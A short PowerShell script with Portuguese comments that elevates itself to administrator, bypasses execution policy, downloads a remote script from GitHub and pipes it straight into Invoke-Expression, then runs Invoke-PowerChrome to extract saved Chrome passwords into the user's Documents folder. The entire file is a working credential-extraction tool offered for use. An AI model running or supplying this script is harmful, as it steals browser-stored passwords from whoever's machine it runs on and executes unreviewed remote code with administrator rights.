# ExtrairSenhas.ps1 - Versão que apenas chama o original e muda a pasta para Documents

# Força a execução como administrador (necessário para Chrome v20)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

Write-Host "Carregando script do GitHub..." -ForegroundColor Cyan
IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

Write-Host "Executando extração de senhas do Chrome..." -ForegroundColor Cyan
Write-Host "Os arquivos serao salvos na pasta Documents..." -ForegroundColor Yellow

# Muda temporariamente o diretório atual para Documents
$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
Push-Location $pastaDocuments

# Executa o script original (ele vai salvar os arquivos na pasta atual = Documents)
Invoke-PowerChrome -Browser Chrome

# Volta para a pasta original
Pop-Location

Write-Host "`n===================================================" -ForegroundColor Green
Write-Host "Pronto! Os arquivos foram salvos em: $pastaDocuments" -ForegroundColor Green
Write-Host "===================================================" -ForegroundColor Green

Write-Host "`nPressione qualquer tecla para fechar..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
